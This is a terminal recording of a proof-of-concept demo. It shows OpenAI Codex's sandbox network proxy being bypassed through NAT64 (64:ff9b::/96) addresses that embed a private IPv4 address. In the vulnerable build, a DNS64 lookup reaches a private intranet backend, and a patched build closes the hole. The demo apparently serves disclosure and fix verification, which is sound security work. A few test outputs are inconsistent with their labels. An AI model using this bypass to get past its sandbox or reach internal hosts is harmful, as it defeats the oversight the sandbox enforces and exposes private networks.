{"version": 2, "width": 80, "height": 64, "timestamp": 1794561596, "env": {"SHELL": "/bin/bash", "TERM": "xterm-256color"}}
[0.0, "o", "\u001b[2J\u001b[H"]
[0.001, "o", "\u001b[1;37m NAT64 SSRF bypass in the OpenAI Codex sandbox proxy\u001b[0m\r\n"]
[0.001, "o", "\u001b[2mtarget: codex-rs/network-proxy @ c0cc9fc (main)\u001b[0m\r\n"]
[1.602, "o", "\r\n"]
[1.603, "o", "\u001b[1;36m== 1/5  the gate that must block private addresses ==\u001b[0m\r\n"]
[3.006, "o", "fn is_non_public_ipv6(ip: Ipv6Addr) -> bool {\r\n"]
[3.006, "o", "    if let Some(v4) = ip.to_ipv4() {\r\n"]
[3.006, "o", "        return is_non_public_ipv4(v4) || ip.is_loopback();\r\n"]
[3.006, "o", "    }\r\n"]
[3.006, "o", "    // Treat anything that isn't globally routable as \"local\" for SSRF preve\r\n"]
[3.006, "o", "    //  - `::1` loopback\r\n"]
[3.006, "o", "    //  - `fc00::/7` unique-local (RFC 4193)\r\n"]
[3.006, "o", "    //  - `fe80::/10` link-local\r\n"]
[3.006, "o", "    //  - `::` unspecified\r\n"]
[3.006, "o", "    //  - multicast ranges\r\n"]
[3.006, "o", "    ip.is_loopback()\r\n"]
[3.006, "o", "        || ip.is_unspecified()\r\n"]
[3.006, "o", "        || ip.is_multicast()\r\n"]
[3.006, "o", "        || ip.is_unique_local()\r\n"]
[3.006, "o", "        || ip.is_unicast_link_local()\r\n"]
[3.006, "o", "}\r\n"]
[3.006, "o", "\u001b[2m  -> only IPv4-mapped addresses are decoded; no 64:ff9b::/96 handling\u001b[0m\r\n"]
[5.207, "o", "\r\n"]
[5.207, "o", "\u001b[1;36m== 2/5  stage A: same classifier compiled with real rustc ==\u001b[0m\r\n"]
[6.731, "o", "\r\n"]
[6.731, "o", "NAT64 WKP + private v4 [64:ff9b::a14:a]  vulnerable=false fixed=true \r\n"]
[6.731, "o", "plain private v4 [10.20.0.10]            vulnerable=true  fixed=true \r\n"]
[6.731, "o", "\u001b[2m  ...\u001b[0m\r\n"]
[6.732, "o", "VERDICT: CONFIRMED - 64:ff9b::a14:a (embeds private 10.20.0.10) is classified as PUBLIC\r\n"]
[8.933, "o", "\r\n"]
[8.933, "o", "\u001b[1;36m== 3/5  lab: DNS64 resolver + private intranet backend (netns) ==\u001b[0m\r\n"]
[10.946, "o", "\u001b[2m  DNS64:   web.internal.corp -> AAAA 64:ff9b::a14:a (embeds 10.20.0.10)\u001b[0m\r\n"]
[10.946, "o", "\u001b[2m  backend: 10.20.0.10:80  [64:ff9b::a14:a]:80  [64:ff9b::808:808]:80\u001b[0m\r\n"]
[10.946, "o", "\u001b[2m  netns:   whole 64:ff9b::/96 locally routable (NAT64 flow emulation)\u001b[0m\r\n"]
[10.946, "o", "\r\n"]
[10.946, "o", "\u001b[1;36m== 4/5  VULNERABLE build: real proxy (all 3 hostnames on allowlist) ==\u001b[0m\r\n"]
[12.55, "o", "\u001b[1;37mTEST 1  GET http://10.20.0.10/  (direct private IPv4)\u001b[0m\r\n"]
[12.556, "o", "   =>  HTTP 403\r\n"]
[12.557, "o", "\u001b[1;31m   blocked by the proxy as expected\u001b[0m\r\n"]
[14.158, "o", "\u001b[1;37mTEST 2  GET http://web.internal.corp/  (DNS64: 64:ff9b::a14:a)\u001b[0m\r\n"]
[14.768, "o", "Intra-VPC Connectivity Verified! backend=10.20.0.10 route=web.internal.corp\r\n"]
[14.768, "o", "\r\n"]
[14.768, "o", "   =>  HTTP 200\r\n"]
[14.768, "o", "\u001b[1;33m   ^^ BYPASS: response came from the PRIVATE backend 10.20.0.10\u001b[0m\r\n"]
[17.57, "o", "\r\n"]
[17.571, "o", "\u001b[1;36m== 5/5  PATCHED build (RFC 6052 WKP decode fix) ==\u001b[0m\r\n"]
[19.175, "o", "\u001b[1;37mTEST 2  GET http://web.internal.corp/  (same DNS64 path)\u001b[0m\r\n"]
[19.193, "o", "   body: Sandbox policy blocks local/private network addresses.\r\n"]
[19.203, "o", "   =>  HTTP 403\r\n"]
[19.203, "o", "\u001b[1;32m   bypass closed by the fix\u001b[0m\r\n"]
[20.804, "o", "\u001b[1;37mTEST 3  GET http://publicnat.internal.corp/  (legit NAT64 -> 8.8.8.8)\u001b[0m\r\n"]
[20.812, "o", "Intra-VPC Connectivity Verified! backend=10.20.0.10 route=publicnat.internal.corp\r\n"]
[20.813, "o", "\r\n"]
[20.813, "o", "   =>  HTTP 200\r\n"]
[20.813, "o", "\u001b[1;32m   legitimate NAT64 still works - no false positive\u001b[0m\r\n"]
[22.015, "o", "\r\n"]
[22.015, "o", "\u001b[1;36m== verdict ==\u001b[0m\r\n"]
[23.416, "o", "  TEST                               VULNERABLE   PATCHED\r\n"]
[23.416, "o", "  T1  direct private IPv4            403 block    403 block\r\n"]
[23.416, "o", "  T2  DNS64 -> private 10.20.0.10    200 BYPASS   403 block\r\n"]
[23.417, "o", "  T3  plain A -> private             403 block    403 block\r\n"]
[23.417, "o", "  T4  DNS64 -> public 8.8.8.8        200 ok       200 ok\r\n"]
[23.417, "o", "\r\n"]
[23.417, "o", "\u001b[1;31m  CONFIRMED: private-address gate bypassable via RFC 6052 NAT64 WKP\u001b[0m\r\n"]
[23.417, "o", "\u001b[1;32m  FIX VERIFIED: WKP decode closes it, legit NAT64 unaffected\u001b[0m\r\n"]
[23.417, "o", "\r\n"]
[23.417, "o", "\u001b[2m  repo: github.com/BOSSMANIWAY/codex-nat64\u001b[0m\r\n"]
